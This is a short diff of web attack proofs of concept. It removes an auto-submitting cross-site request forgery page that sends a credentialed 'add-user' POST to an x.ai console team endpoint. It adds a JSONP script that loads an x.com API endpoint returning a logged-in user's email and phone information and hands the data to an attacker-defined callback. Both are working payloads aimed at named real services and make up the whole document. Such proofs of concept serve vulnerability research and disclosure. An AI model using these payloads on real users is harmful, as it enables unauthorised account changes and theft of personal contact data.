@@ -1,20 +1,8 @@
-<!DOCTYPE html>
-  <html>
-  <head>
-      <title>CSRF PoC</title>
-  </head>
-  <body>
-      <h3>XHR CSRF PoC</h3>
-      <script>
-      function sendXHR() {
-          var xhr = new XMLHttpRequest();
-          xhr.open("post", "https://console.x.ai/team/fe5bc330-c191-474d-a460-2c0a1fa20c34/users?action=add-user", true);
-          xhr.withCredentials = true;
-          xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-          xhr.send("");
-      }
-      sendXHR();
-      </script>
-      <button onclick="sendXHR()">Send Request</button>
-  </body>
-  </html>
+<script>
+function rip(a) {
+
+alert(JSON.stringify(a[1]));
+
+}
+</script>
+<script src="https://x.com/i/api/1.1/users/email_phone_info.json?callback=rip"></script>
